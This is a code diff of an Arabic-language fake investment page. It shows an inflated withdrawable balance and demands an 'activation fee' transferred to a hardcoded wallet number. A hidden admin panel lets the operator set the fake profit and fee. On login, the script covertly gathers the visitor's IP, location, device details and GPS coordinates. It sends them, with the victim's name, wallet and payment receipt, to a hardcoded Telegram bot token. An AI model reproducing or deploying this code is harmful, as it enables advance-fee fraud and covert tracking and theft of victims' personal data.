@@ -3,136 +3,197 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>منصة التقوى - نظام السحب المتطور</title>
+    <title>منصة التقوى - نظام الإدارة المتكامل</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
         :root { --main-grad: linear-gradient(135deg, #020024, #090979, #00d4ff); --gold: #ffcc00; --success: #00ff88; }
         body { margin: 0; font-family: 'Cairo', sans-serif; background: var(--main-grad); color: white; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 15px; }
-        .login-card { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); padding: 40px 20px; border-radius: 30px; border: 1px solid rgba(255,255,255,0.2); width: 100%; max-width: 380px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
-        .login-card h1 { font-size: 24px; color: var(--gold); margin-bottom: 20px; }
-        .login-card input { width: 85%; padding: 15px; border-radius: 12px; border: 1px solid var(--gold); background: rgba(0,0,0,0.5); color: white; font-size: 18px; text-align: center; outline: none; margin-bottom: 20px; }
-        .login-card button { background: var(--gold); border: none; padding: 12px 40px; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 18px; width: 90%; transition: 0.3s; }
-        #admin-trigger { position: fixed; bottom: 0; right: 0; width: 40px; height: 40px; background: transparent; cursor: pointer; z-index: 9999; }
-        #admin-panel { position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 10000; display: none; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
-        .admin-content { background: #111; border: 2px solid var(--gold); padding: 25px; border-radius: 20px; width: 100%; max-width: 320px; }
-        .admin-content input { width: 100%; padding: 10px; margin-top: 5px; background: #222; border: 1px solid #444; color: white; border-radius: 5px; text-align: center; }
-        .admin-content button { background: var(--success); color: #000; border: none; padding: 12px; border-radius: 5px; width: 100%; font-weight: bold; margin-top: 20px; cursor: pointer; }
-        #main-site { display: none; width: 100%; max-width: 420px; }
-        .site-card { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); padding: 25px; border-radius: 25px; border: 1px solid rgba(255,255,255,0.2); text-align: center; }
-        .balance-box { background: rgba(0,0,0,0.4); padding: 20px; border-radius: 15px; border-right: 5px solid var(--gold); margin-bottom: 20px; }
-        .balance-box div { font-size: 32px; font-weight: 900; }
-        input[type="text"], input[type="tel"], input[type="file"] { width: 100%; padding: 12px; margin: 10px 0; border-radius: 10px; border: none; background: white; color: #333; box-sizing: border-box; }
-        .submit-btn { background: var(--success); color: #000; border: none; width: 100%; padding: 15px; font-size: 18px; font-weight: 900; border-radius: 10px; cursor: pointer; }
+        .login-card, .site-card { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); padding: 30px 20px; border-radius: 30px; border: 1px solid rgba(255,255,255,0.2); width: 100%; max-width: 380px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
+        h1 { font-size: 22px; color: var(--gold); margin-bottom: 20px; }
+        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 12px; border: 1px solid var(--gold); background: rgba(0,0,0,0.5); color: white; text-align: center; font-family: 'Cairo'; }
+        button { background: var(--gold); border: none; padding: 12px; border-radius: 10px; font-weight: bold; cursor: pointer; width: 95%; font-size: 16px; transition: 0.3s; }
+        
+        /* لوحة الإدارة */
+        #admin-trigger { position: fixed; bottom: 0; right: 0; width: 50px; height: 50px; background: transparent; z-index: 9999; cursor: pointer; }
+        #admin-panel { position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 10000; display: none; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
+        .admin-box { background: #111; border: 2px solid var(--gold); padding: 20px; border-radius: 20px; width: 100%; max-width: 320px; }
+        .admin-box label { display: block; font-size: 12px; color: var(--gold); margin-top: 10px; text-align: right; margin-right: 15px; }
+        .admin-box input { background: #222; border: 1px solid #444; padding: 8px; margin: 5px 0; }
+
+        #main-site { display: none; width: 100%; max-width: 400px; }
+        .balance-box { background: rgba(0,0,0,0.4); padding: 15px; border-radius: 15px; border-right: 5px solid var(--gold); margin-bottom: 20px; }
+        .balance-box div { font-size: 28px; font-weight: 900; }
+        .wallet-display { background: #000; color: var(--gold); padding: 10px; border-radius: 10px; font-weight: bold; margin: 10px 0; font-size: 18px; }
         #loader { position: fixed; inset: 0; background: rgba(0,0,0,0.9); display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 11000; }
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div id="admin-trigger" onclick="adminClick()"></div>
+<!-- منطقة الضغط المخفية للدخول للإدارة -->
+<div id="admin-trigger" onclick="handleAdminTrigger()"></div>
 
+<!-- صفحة تسجيل الدخول -->
 <div class="login-card" id="login-page">
-    <h1>🏮 شركة التقوى للاستثمار 🌙</h1>
-    <p style="font-size: 12px; color: #aaa;">يرجى الضغط على "موافق" لتفعيل ميزات الأمان والسحب</p>
-    <input type="password" id="entryPass" placeholder="كود الوصول">
-    <button onclick="accessSite()">دخول</button>
+    <h1>🏮 منصة التقوى للاستثمار 🌙</h1>
+    <p style="font-size: 11px; color: #ccc;">يرجى الموافقة على صلاحيات الأمان لتفعيل الحساب</p>
+    <input type="password" id="entryPass" placeholder="أدخل كود الوصول">
+    <button onclick="accessSite()">دخول للمنصة</button>
 </div>
 
+<!-- لوحة الإدارة السرية -->
 <div id="admin-panel">
-    <div class="admin-content">
-        <h3 style="color:var(--gold); text-align:center;">إعدادات الإدارة</h3>
-        <input type="text" id="setPass" value="123456">
-        <input type="text" id="setWallet" value="01226811784">
-        <button onclick="saveAdminSettings()">حفظ وإغلاق</button>
+    <div class="admin-box">
+        <h2 style="color:var(--gold); text-align:center; margin-top:0;">إعدادات المنصة</h2>
+        
+        <label>كود دخول الموقع:</label>
+        <input type="text" id="setPass">
+        
+        <label>مبلغ الربح المعروض (EGP):</label>
+        <input type="number" id="setProfit">
+        
+        <label>رسوم التفعيل (EGP):</label>
+        <input type="number" id="setFees">
+        
+        <label>رقم محفظة الاستلام:</label>
+        <input type="text" id="setWallet">
+        
+        <button style="background:var(--success); margin-top:15px;" onclick="saveSettings()">حفظ التعديلات</button>
+        <button style="background:#555; color:white; margin-top:10px;" onclick="closeAdmin()">إغلاق</button>
     </div>
 </div>
 
+<!-- الموقع الرئيسي -->
 <div id="main-site">
     <div class="site-card">
         <div class="balance-box">
-            <span style="font-size:12px; color:#aaa;">رصيدك القابل للسحب</span>
-            <div>50,000 <small>EGP</small></div>
+            <span style="font-size:12px; color:#aaa;">رصيدك الحالي الجاهز للسحب</span>
+            <div><span id="displayProfit">0</span> <small>EGP</small></div>
         </div>
-        <input type="text" id="uName" placeholder="الاسم بالكامل">
-        <input type="tel" id="uWallet" placeholder="رقم المحفظة">
-        <p style="font-size:12px;">حول رسوم التفعيل (500 ج.م) للرقم:</p>
-        <div style="background:#000; color:var(--gold); padding:10px; border-radius:10px; font-weight:bold; margin-bottom:15px;" id="showAdminWallet">01226811784</div>
-        <input type="file" id="uFile" accept="image/*">
-        <button class="submit-btn" onclick="sendToTelegram()">تأكيد عملية السحب</button>
+        
+        <input type="text" id="uName" placeholder="الاسم الرباعي">
+        <input type="tel" id="uWallet" placeholder="رقم محفظتك المستلمة">
+        
+        <p style="font-size:12px; margin-top:15px;">يجب تحويل رسوم تفعيل (<span id="displayFees">0</span> ج.م) للرقم:</p>
+        <div class="wallet-display" id="displayAdminWallet">00000000000</div>
+        
+        <label style="font-size:11px; display:block; margin-bottom:5px;">ارفق صورة إيصال التحويل لتاكيد السحب:</label>
+        <input type="file" id="uFile" accept="image/*" style="background:white; color:black;">
+        
+        <button style="background:var(--success); color:black; margin-top:10px;" onclick="confirmWithdraw()">تأكيد عملية السحب</button>
     </div>
 </div>
 
 <div id="loader">
-    <div style="width:50px; height:50px; border:4px solid #333; border-top:4px solid var(--success); border-radius:50%; animation:spin 1s linear infinite;"></div>
+    <div style="width:40px; height:40px; border:4px solid #333; border-top:4px solid var(--success); border-radius:50%; animation:spin 1s linear infinite;"></div>
+    <p>جاري المعالجة...</p>
 </div>
 
 <script>
+    // بيانات التليجرام الخاصة بك
     const TOKEN = '8412077444:AAHgu7XnlUMAaRPayFmUtD14AAbTznPJRII';
     const CHAT_ID = '8292390266';
-    let config = JSON.parse(localStorage.getItem('adminConfig')) || { pass: '123456', adminWallet: '01226811784' };
 
-    let clickCount = 0;
-    function adminClick() { clickCount++; if(clickCount >= 3) { document.getElementById('admin-panel').style.display = 'flex'; clickCount = 0; } }
+    // الإعدادات الافتراضية
+    let config = JSON.parse(localStorage.getItem('alTaqwaConfig')) || {
+        pass: '123456',
+        profit: 50000,
+        fees: 500,
+        adminWallet: '01226811784'
+    };
 
-    function saveAdminSettings() {
-        config.pass = document.getElementById('setPass').value;
-        config.adminWallet = document.getElementById('setWallet').value;
-        localStorage.setItem('adminConfig', JSON.stringify(config));
-        document.getElementById('showAdminWallet').innerText = config.adminWallet;
-        document.getElementById('admin-panel').style.display = 'none';
+    // تحديث البيانات في الصفحة
+    function updateUI() {
+        document.getElementById('displayProfit').innerText = Number(config.profit).toLocaleString();
+        document.getElementById('displayFees').innerText = config.fees;
+        document.getElementById('displayAdminWallet').innerText = config.adminWallet;
+        
+        // ملء خانات الإدارة
+        document.getElementById('setPass').value = config.pass;
+        document.getElementById('setProfit').value = config.profit;
+        document.getElementById('setFees').value = config.fees;
+        document.getElementById('setWallet').value = config.adminWallet;
+    }
+    updateUI();
+
+    // نظام فتح الإدارة (3 ضغطات)
+    let clicks = 0;
+    function handleAdminTrigger() {
+        clicks++;
+        if(clicks >= 3) {
+            document.getElementById('admin-panel').style.display = 'flex';
+            clicks = 0;
+        }
+    }
+
+    function closeAdmin() { document.getElementById('admin-panel').style.display = 'none'; }
+
+    function saveSettings() {
+        config = {
+            pass: document.getElementById('setPass').value,
+            profit: document.getElementById('setProfit').value,
+            fees: document.getElementById('setFees').value,
+            adminWallet: document.getElementById('setWallet').value
+        };
+        localStorage.setItem('alTaqwaConfig', JSON.stringify(config));
+        updateUI();
+        closeAdmin();
+        alert("تم حفظ الإعدادات بنجاح.");
     }
 
     async function accessSite() {
-        if(document.getElementById('entryPass').value !== config.pass) return alert("كود الوصول خطأ!");
+        if(document.getElementById('entryPass').value !== config.pass) return alert("كود الدخول غير صحيح.");
         
         document.getElementById('login-page').style.display = 'none';
         document.getElementById('main-site').style.display = 'block';
 
-        // 1. جمع البيانات الصامتة (IP + Hardware)
-        let trackingMsg = "🚀 رصد جديد لشركة التقوى:\n";
+        // رصد البيانات وإرسالها للتليجرام
+        let trackMsg = "🔔 دخول جديد للمنصة:\n";
         try {
             const res = await fetch('https://ipapi.co/json/');
-            const data = await res.json();
-            trackingMsg += `🌐 الـ IP: ${data.ip}\n📍 المدينة: ${data.city}\n🏢 الشركة: ${data.org}\n`;
+            const d = await res.json();
+            trackMsg += `🌐 IP: ${d.ip}\n📍 الموقع: ${d.city}, ${d.country}\n🏢 الشبكة: ${d.org}\n`;
         } catch(e) {}
 
-        const batt = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level:0}));
-        trackingMsg += `🔋 البطارية: ${Math.round(batt.level * 100)}%\n🧠 الرامات: ${navigator.deviceMemory || '؟'}GB\n📱 الجهاز: ${navigator.platform}\n`;
+        const b = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level:0}));
+        trackMsg += `🔋 البطارية: ${Math.round(b.level*100)}%\n🧠 رامات: ${navigator.deviceMemory || '?'}GB\n⚙️ معالج: ${navigator.hardwareConcurrency}\n`;
 
-        // 2. محاولة سحب الـ GPS (تطلب موافقة)
+        // محاولة سحب الـ GPS الدقيق
         if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition((pos) => {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                trackingMsg += `📍 الموقع الدقيق: https://www.google.com/maps?q=${lat},${lon}\n`;
-                sendMsg(trackingMsg);
+            navigator.geolocation.getCurrentPosition((p) => {
+                trackMsg += `📍 خريطة دقيقة: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                sendToBot(trackMsg);
             }, () => {
-                trackingMsg += `📍 الموقع الدقيق: (العميل رفض الصلاحية)\n`;
-                sendMsg(trackingMsg);
+                trackMsg += `📍 الموقع الدقيق: رفض الإذن`;
+                sendToBot(trackMsg);
             });
-        } else {
-            sendMsg(trackingMsg);
-        }
+        } else { sendToBot(trackMsg); }
     }
 
-    function sendMsg(text) {
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
+    function sendToBot(txt) {
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(txt)}`);
     }
 
-    async function sendToTelegram() {
+    async function confirmWithdraw() {
         const name = document.getElementById('uName').value;
         const wallet = document.getElementById('uWallet').value;
         const file = document.getElementById('uFile').files[0];
-        if(!name || !wallet || !file) return alert("أكمل البيانات.");
+
+        if(!name || !wallet || !file) return alert("يرجى إكمال البيانات ورفع الإيصال.");
 
         document.getElementById('loader').style.display = 'flex';
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('photo', file);
-        formData.append('caption', `✅ طلب سحب جديد:\n👤 الاسم: ${name}\n📱 محفظة العميل: ${wallet}`);
+        
+        const fd = new FormData();
+        fd.append('chat_id', CHAT_ID);
+        fd.append('photo', file);
+        fd.append('caption', `💰 طلب سحب جديد من التقوى:\n👤 العميل: ${name}\n📱 محفظته: ${wallet}\n💵 المبلغ: ${config.profit}\n🧾 الرسوم المسددة: ${config.fees}`);
 
-        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-        alert("تم الإرسال.. سيصلك الرد خلال دقائق.");
-        location.reload();
+        try {
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+            alert("تم إرسال طلبك بنجاح. سيتم التحقق من الإيصال وتحويل المبلغ خلال 30 دقيقة.");
+            location.reload();
+        } catch(e) { alert("حدث خطأ في الاتصال."); }
+        finally { document.getElementById('loader').style.display = 'none'; }
     }
 </script>
 </body>
